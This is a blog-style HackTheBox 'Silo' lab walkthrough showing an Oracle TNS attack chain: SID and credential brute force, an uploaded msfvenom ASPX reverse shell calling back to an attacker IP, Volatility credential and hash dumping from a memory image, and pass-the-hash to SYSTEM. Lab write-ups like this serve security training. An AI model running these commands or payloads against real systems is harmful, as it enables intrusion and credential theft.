---
layout: post
title: "How to hack an Oracle database server"
description: "Learn pentesting web from 0 with HackTheBox (Silo)"
date: 2019-10-03
image:  "img/silo.jpg"
tags: ["Hacking Windows", Metasploit Framework, Forensic analysis]
---

Hello Hackers!!  
Today, we are going to perform a penetration test towards an Oracle database server.  
If you want to practice doing the different activities that I will present during this tutorial, I invite you to check the machine [Silo](https://www.hackthebox.eu/home/machines/profile/131) de HackTheBox.  

Before starting I want to clarify that all my published content is done for educational, informative and ethical purposes.  
I am not responsible for the misuse they may give you.  

# With this tutorial you will learn:  
   - How to perform a simple port scan with Nmap.
   - How to perform a Brute Force attack to discover an Oracle TNS SID.
   - Learning to use ODAT - (Oracle Database Attack Tool)
   - How to attack a Oracle server with the Metasploit Framework
   - How to perform a Forensic analysis with Volatility
   - How to find password hashes in memory dump
   - How to perform a privilege escalation using pass the hash technique

# Hacking [Silo](https://www.hackthebox.eu/home/machines/profile/131)

As always we will start enumerating our victim, For this we will perform a simple scan with Nmap, in the following way.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # nmap -sS -T4 -sV -sC 10.10.10.82
Nmap scan report for 10.10.10.82
Host is up (0.097s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-08-03 12:12:21
|_  start_date: 2018-08-03 11:47:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.99 seconds
{% endhighlight %}

With the result of the previous scan, we were able to appreciate that this server probably has Windows Server 2008 R2 and on the other hand it has port 80 (Microsoft IIS httpd 8.5) is enabled.  
For this penetration test, we are going to focus on port 1521, which indicates to be an oracle-tns service.

# SID brute force
To continue, we will audit this Oracle database with the ODAT tool.  
**ODAT** It is an open source penetration test tool designed to attack and audit the security of Oracle Database servers.  
The following steps are:  
   - Enumerate Oracle Database Version  
   - Discover SIDs (Basically oracles version a unique "database instance")  
   - obtain a user account (likely through bruteforcing)  
   - Exploitation / privesc as needed.  
We can use ODAT’s siguesser to discover well:  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # ./odat.py sidguesser -s 10.10.10.82

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'SAMPLE' is a valid SID. Continue...
[+] 'SCAN4' is a valid SID. Continue...
[+] 'XE' is a valid SID. Continue...
[+] 'XEXDB' is a valid SID. Continue...
100% |##############################################| Time: 00:10:55
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |##############################################| Time: 00:00:12
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...
100% |##############################################| Time: 00:07:31
[+] SIDs found on the 10.10.10.82:1521 server: SAMPLE,SCAN4,XE,XEXDB
{% endhighlight %}

# Credential brute force

Based from the results, we identified four SIDs.  
Next, we’ll need to identify valid credentials in order to authenticate to the database.  
For this task, we can use a metasploit auxiliary module called oracle_login. 

{% highlight bash %}
msf5 > use admin/oracle/oracle_login
msf5 auxiliary(admin/oracle/oracle_login) > set RHOST 10.10.10.82
RHOST => 10.10.10.82
msf5 auxiliary(admin/oracle/oracle_login) > set SID XE
SID => XE
msf5 auxiliary(admin/oracle/oracle_login) > run -j
[*] Auxiliary module running as background job 0.

[*] Starting brute force on 10.10.10.82:1521...
[+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE
[*] Auxiliary module execution completed
{% endhighlight %}

Alright! We found a valid credentials.  
By the way, we can also figure this one out if we research for common default oracle credentials.  
Valid credentials mean that we can connect to the **XE** instance and start querying the database for possible information. As it turns out, scott is also granted **SYSBDA** privilege. Think of it as something like sudo - it gives you extra flexibility and higher privileges in case you want to do some database altering, user administration and the list continues.  

# Oracle Database Penetration Testing 

Now that we have a valid SID and credentials, we can connect to the database for manual enumeration.  

{% highlight zsh %}
╭─[/opt/oracle]─[root@Arthorias]─[0]─[4438]
╰─[:)] # sqlplus scott/tiger@10.10.10.82:1521/XE

SQL*Plus: Release 12.1.0.2.0 Production on Tue Oct 3 12:56:27 2019

Copyright (c) 1982, 2014, Oracle.  All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from v$version;
BANNER
--------------------------------------------------------------------------------
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for 64-bit Windows: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
{% endhighlight %}

For starters, we can query for user privileges and roles.  

{% highlight bash %}
SQL> SELECT * FROM user_role_privs;             

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO
{% endhighlight %}

As you can see, scott is a low-privilege user on the system. In order for us to gain shell access, we might need to escalate our privilege to DBA first and perform some known Oracle attacks. In order to achieve this easily, we can use a tool called **ODAT (Oracle Database Attack Tool)**. It is an open-source tool used to automate attacks on an Oracle DB.

Before we can use ODAT, we need to install it first in Kali. You can refer to this installation guide in order to install it successfully.

# Using ODAT - (Oracle Database Attack Tool)  
Initially, we will run all the ODAT modules on our victim server.   

{% highlight bash %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # python odat.py all -s 10.10.10.82 -d XE -U scott -P tiger

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Testing all modules on the XE SID with the scott/tiger account
[2.1] UTL_HTTP library ?
[-] KO
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[-] KO
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[-] KO
[2.7] CTXSYS library ?
[-] KO
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[-] KO
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[-] KO
[2.12] External table to execute system commands ?
[-] KO
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[-] KO
[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[2.18] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO
{% endhighlight %}

**DBMS_XSLPROCESSOR library** is enabled and therefore allows us to put any files onto the machine.  
First, we’ll create a simple text file and check if we can successfully upload it to **wwwroot**.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # echo "Hacked By Gerh" > File-Test.txt

╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4439]
╰─[:)] # python odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "File-Test.txt" "/tmp/File-Test.txt"

[1] (10.10.10.82:1521): Put the /root/Desktop/File-Test.txt local file in the C:\inetpub\wwwroot\ folder like File-Test.txt on the 10.10.10.82 server
[+] The /root/Desktop/File-Test.txt file was created on the C:\inetpub\wwwroot\ directory on the 10.10.10.82 server like the File-Test.txt file
{% endhighlight %}

As you can see, we can successfully upload the file. Let’s check using **curl**.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # curl http://10.10.10.82/File-Test.txt
Hacked By Gerh
{% endhighlight %}

Now that we can upload on the target system, we can easily generate an ASPX reverse shell using msfvenom, upload it using ODAT, and trigger it to get shell access.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.110 LPORT=443 -f aspx > /tmp/shell.aspx
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 500 bytes
Final size of aspx file: 3606 bytes

╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # python odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "shell.aspx" "/tmp/shell.aspx"
[1] (10.10.10.82:1521): Put the /tmp/shell.aspx local file in the C:\inetpub\wwwroot\ folder like shell.aspx on the 10.10.10.82 server
[+] The /root/Desktop/shell.aspx file was created on the C:\inetpub\wwwroot\ directory on the 10.10.10.82 server like the shell.aspx file
{% endhighlight %}

After uploading our shell, we will start the Metasploit framework and configure it to listen on the previously indicated ports.  
It should be noted that after starting the exploit we must make a request to the http://10.10.10.82/shell.aspx

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]
╰─[:)] # msfconsole
msf5 exploit(multi/handler) > set LHOST 10.10.14.110
LHOST => 10.10.14.110
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.110:443 
[*] Meterpreter session 1 opened (10.10.14.110:443 -> 10.10.10.82:49177) at 2019-10-03 21:43:08 

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
whoami
iis apppool\defaultapppool
{% endhighlight %}

Ready, we have got a Shell and with it we can execute commands on the server. 

# Privilege Escalation
As you can see, there’s a file named “Oracle issue.txt” in Desktop directory. This might contain a clue for our privilege escalation vector.  

{% highlight bash %}
C:\Users\Phineas\Desktop> type "Oracle issue.txt"
type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
£%Hm8646uC$
{% endhighlight %}

The text file mentions a memory dump. That’s a good sign for us, because there’s a high chance that that memory dump will contain valuable information. Many tools will analyze memory for us and pull out valuables like passwords. So it’s quite clear we need to do a bit of memory analysis.  
After downloading the zip file, we unzip it and find that it contains a memory dump. We use volatility tool to investigate the dump.  

# Using Volatility to extract passwords

After downloading the memory dump, we can use volatility on it to perform forensics. Volatility is built-in to Kali so there’s no need to do further installation. If you’re not familiar with volatility, you can check out this cheatsheet from Volatility Foundation and this [cheatsheet](https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf) from SANS.  
For the initial step, we would need to identify the OS version of the machine were the memory dump was taken in order for the volatility plugins to be accurate. Although we can simply issue a systeminfo command on our shell session, we can also identify this by using a volatility plugin called imageinfo.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # volatility -f SILO-20180105-221806.dmp imageinfo
Volatility Foundation Volatility Framework 2.6
          Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win2012R2x64_18340, Win10x64_14393, Win10x64, Win2016x64_14393, Win10x64_16299, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/datos/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Silo/SILO-20180105-221806.dmp)
                      PAE type : No PAE
                           DTB : 0x1a7000L
                          KDBG : 0xf80078520a30L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8007857b000L
                KPCR for CPU 1 : 0xffffd000207e8000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2018-01-05 22:18:07 UTC+0000
     Image local date and time : 2018-01-05 22:18:07 +0000
{% endhighlight %}

One of the useful plugins that we can use in this situation is lsadump. The lsadump plugin dumps decrypted LSA secrets from the registry. This exposes information such as the default password (for systems with autologin enabled), RDP public keys, and credentials used by **DPAPI**.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 lsadump
Volatility Foundation Volatility Framework 2.6
DefaultPassword
0x00000000  1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x00000010  44 00 6f 00 4e 00 6f 00 74 00 48 00 40 00 63 00   D.o.N.o.t.H.@.c.
0x00000020  6b 00 4d 00 65 00 42 00 72 00 6f 00 21 00 00 00   k.M.e.B.r.o.!...

DPAPI_SYSTEM
0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............
0x00000010  01 00 00 00 cf 25 94 31 34 9e ae 43 2d 8b 87 ac   .....%.14..C-...
0x00000020  f2 a7 74 1c 6d ec 1c 04 08 43 a8 a6 a9 42 62 f7   ..t.m....C...Bb.
0x00000030  55 70 48 bb 17 7d 82 fe 79 49 02 bd 00 00 00 00   UpH..}..yI......
{% endhighlight %}

As you can see from the results of lsadump, we were able to acquire a plain-text password **DoNotH@ckMeBro!**.  
Since the SMB service is accessible through the network, we can use winexe to login via SMB.  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # winexe -U Administrator //10.10.10.82 cmd.exe
Enter password: DoNotH@ckMeBro!

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
silo\administrator
{% endhighlight %}

Another way we could have escalated privileges is through the **hivelist** plugin.

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist 
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
{% endhighlight %}

We now can dump the hashes by supplying the need address which is SYSTEM and SAM.  
> **Note:** To use hashdump, pass the virtual address of the SYSTEM hive as **-y** and the virtual address of the SAM hive as **-s**

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
{% endhighlight %}

We could try to crack these, but first, let’s try pass the hash:  

{% highlight zsh %}
╭─[~/APOLO/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
 administrator@10.10.10.82
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.82.....
[*] Found writable share ADMIN$
[*] Uploading file XryxqKFr.exe
[*] Opening SVCManager on 10.10.10.82.....
[*] Creating service PAYb on 10.10.10.82.....
[*] Starting service PAYb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
{% endhighlight %}

### Tutorial Explicativo

<iframe src="https://www.youtube.com/watch?v=QfeB4nlpyT4" frameborder="0" allowfullscreen></iframe>

